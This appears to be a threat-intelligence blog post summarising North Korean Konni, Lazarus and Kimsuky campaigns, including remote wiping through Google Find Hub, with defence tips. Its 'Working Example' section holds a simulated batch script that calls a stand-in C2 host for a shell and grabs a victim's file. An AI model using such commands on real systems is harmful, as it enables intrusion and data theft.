---
title: "Konni Hackers Exploit Google Find Hub for Remote Data-Wiping and Multi-Group Cyber Threats"
pubDate: 2025-11-01
description: "North Korea-linked Konni hackers weaponize Google's Find Hub for remote device wiping, while Lazarus and Kimsuky groups deploy advanced malware in targeted campaigns."
categories: ["AI News", "Cyber Security", "Malware Analysis", "Threat Intelligence"]

---

## Konni Hackers Exploit Google Find Hub for Remote Data-Wiping and Multi-Group Cyber Threats

The North Korea-affiliated hacking group **Konni** has escalated its cyber operations by weaponizing **Google's Find Hub** (formerly Find My Device) to remotely wipe data from Android devices, marking a first-of-its-kind exploitation of legitimate asset-tracking services. This attack, detected in early September 2025, is part of a broader campaign involving spear-phishing, malware distribution, and multi-stage infiltration targeting both Android and Windows systems. Concurrently, the **Lazarus Group** and **Kimsuky** have deployed advanced malware variants, highlighting a surge in targeted espionage and data theft.

---

### **Key Attack Vectors and Techniques**

#### **1. Weaponization of Google Find Hub**
- **Mechanism**: Konni uses stolen Google credentials to log into **Find Hub** and initiate remote device wipes, erasing personal data without user consent.
- **Impact**: This method allows attackers to destroy evidence of compromise, rendering devices unusable and complicating forensic analysis.
- **Timeline**: Activity was first detected in early September 2025, with malicious credentials used to delete security alerts and empty trash folders to cover tracks.

#### **2. Spear-Phishing and Social Engineering**
- **Lures**: Attackers impersonate entities like the **National Tax Service** and **North Korean human rights activists**, distributing malware disguised as stress-relief programs.
- **Delivery**: Malicious ZIP archives (e.g., "Stress Clear.msi") are sent via **KakaoTalk** sessions, exploiting trust in personal communication.
- **Malware**: The MSI package, signed with a legitimate Chinese company certificate, executes a **VB Script** to trigger a fake error message while running **AutoIt scripts** to maintain persistence.

#### **3. Malware Capabilities and Command Set**
- **EndRAT (EndClient RAT)**: A custom remote access trojan (RAT) with commands like:
  - `shellStart`/`shellStop`: Remote shell access
  - `download`/`upload`: File exfiltration and injection
  - `delete`: File removal on the host
- **Persistence**: AutoIt scripts are scheduled to run every minute via Windows Task Scheduler, ensuring continuous control.

#### **4. Credential Theft and Reconnaissance**
- **Targets**: Google and **Naver** account credentials are exfiltrated, enabling further attacks.
- **Surveillance**: Compromised systems are monitored via webcams, and internal network reconnaissance is conducted for lateral movement.

---

### **Lazarus Group’s Comebacker Variant**
- **Target**: Aerospace and defense organizations, impersonating **Airbus**, **Edge Group**, and **IIT Kanpur**.
- **Delivery**: Malicious Microsoft Word documents with embedded macros trigger a decoy document and launch **Comebacker** malware in memory.
- **C2 Communication**: Establishes HTTPS connections to a command-and-control server, polling for commands or encrypted payloads.
- **Status**: No confirmed victims yet, but the C2 infrastructure remains active as of November 2025.

---

### **Kimsuky’s JavaScript Dropper**
- **Method**: A new JavaScript-based dropper distributes malware via an initial file ("themes.js") that fetches additional code from adversary-controlled servers.
- **Functionality**:
  - Executes commands, exfiltrates data, and retrieves a third-stage payload.
  - Creates a scheduled task to relaunch the dropper every minute and opens an empty Word document (likely a decoy).
- **Purpose**: Bypasses macro protections by avoiding background macro execution in the decoy document.

---

### **Working Example: Simulating EndRAT’s Command Execution**

```batch
@echo off
REM Simulated malicious batch script (for educational purposes only)
echo [+] Starting remote shell session...
start "" "http://malicious-c2.com/shell" 
REM Example command execution via AutoIt (hypothetical)
AutoItScript.exe /cmd "download C:\Users\Victim\Documents\Secrets.txt"
```

**Note**: This example is illustrative and not functional. Real-world malware would use obfuscation and encryption to evade detection.

---

### **Recommendations for Defense**

- **Enable Multi-Factor Authentication (MFA)**: For Google and Naver accounts to prevent unauthorized access.
- **Monitor Device Management Services**: Regularly audit access to Find Hub and similar tools.
- **Disable Untrusted Macros**: Block macro execution in Microsoft Office documents unless explicitly required.
- **Update Software**: Patch vulnerabilities in legacy applications like KakaoTalk and Adobe Flash.
- **Behavioral Analysis**: Use endpoint detection systems to flag suspicious scheduled tasks or AutoIt scripts.

---

### **Potential Pitfalls to Avoid**
- **Overlooking Legitimate Tools**: Attackers exploit trusted services (e.g., Find Hub) to bypass security measures.
- **Delayed Detection**: Long-term persistence (e.g., 1+ year in compromised systems) allows attackers to exfiltrate data undetected.
- **False Positives**: Decoy documents and error messages may mislead users into ignoring real threats.

---

**Reference**: [The Hacker News Article](https://thehackernews.com/2025/11/konni-hackers-turn-googles-find-hub.html)